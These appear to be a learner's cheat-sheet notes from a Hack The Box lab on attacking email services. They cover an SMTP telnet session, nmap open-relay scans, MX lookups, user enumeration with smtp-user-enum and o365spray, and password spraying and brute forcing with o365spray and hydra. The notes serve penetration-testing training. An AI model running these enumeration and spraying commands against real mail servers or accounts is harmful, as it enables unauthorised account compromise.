## delete


# Interacting
```bash
$ telnet 10.129.14.128 25
```

## Send an Email
```bash
$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server


EHLO inlanefreight.htb

250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING


MAIL FROM: <cry0l1t3@inlanefreight.htb>

250 2.1.0 Ok


RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure

250 2.1.5 Ok


DATA

354 End data with <CR><LF>.<CR><LF>

From: <cry0l1t3@inlanefreight.htb>
To: <mrb3n@inlanefreight.htb>
Subject: DB
Date: Tue, 28 Sept 2021 16:32:51 +0200
Hey man, I am trying to access our XY-DB but the creds don't work. 
Did you make any changes there?
.

250 2.0.0 Ok: queued as 6E1CF1681AB


QUIT

221 2.0.0 Bye
Connection closed by foreign host.
```

# Footprinting the Service
## Nmap
```bash
$ sudo nmap <IP> -sC -sV -p25`
```

## Nmap - Open Relay
```bash
$ sudo nmap <IP> -p25 --script smtp-open-relay -v`
```

## Attacking Email Services
### Host - MX Records
```bash
$ host -t MX hackthebox.eu
```

### DIG - MX Records
```bash
$ dig mx inlanefreight.com | grep "MX" | grep -v ";"
```

### Host - A Records
```
COR33@htb[/htb]$ host -t A mail1.inlanefreight.htb.
```

```
COR33@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

### O365 Spray
```
COR33@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz
```

Now, we can attempt to identify usernames.

```
COR33@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
```

## Password Attacks
### Hydra - Password Attack
```
COR33@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

### O365 Spray - Password Spraying
```
COR33@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```
